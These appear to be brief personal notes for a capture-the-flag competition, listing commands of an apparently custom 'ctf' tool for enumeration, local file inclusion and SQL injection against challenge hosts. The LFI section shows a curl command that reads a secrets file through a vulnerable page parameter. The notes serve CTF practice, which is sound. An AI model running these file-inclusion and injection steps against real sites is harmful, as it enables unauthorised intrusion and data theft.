download every file of the boxes into a folder.
set
export TARGET=ip
S=target sites SQLI, include the whole site, https://sit-sqli.chals.io
T=target site LFI

OSINT challenges
ctf --enum $TARGET


LFI
go to the page, and click on the url to see where ? starts
https://sit-lfi.chals.io/reader.php?page=welcome.php

if we are given the target file, like /secrets/notes.txt

then we run
ctf --lfi "curl -s 'https://sit-lfi.chals.io/reader.php?page={P}'" --file secrets/notes.txt


SQLI
run immediately
ctf --find-input "https://sit-sqli.chals.io"

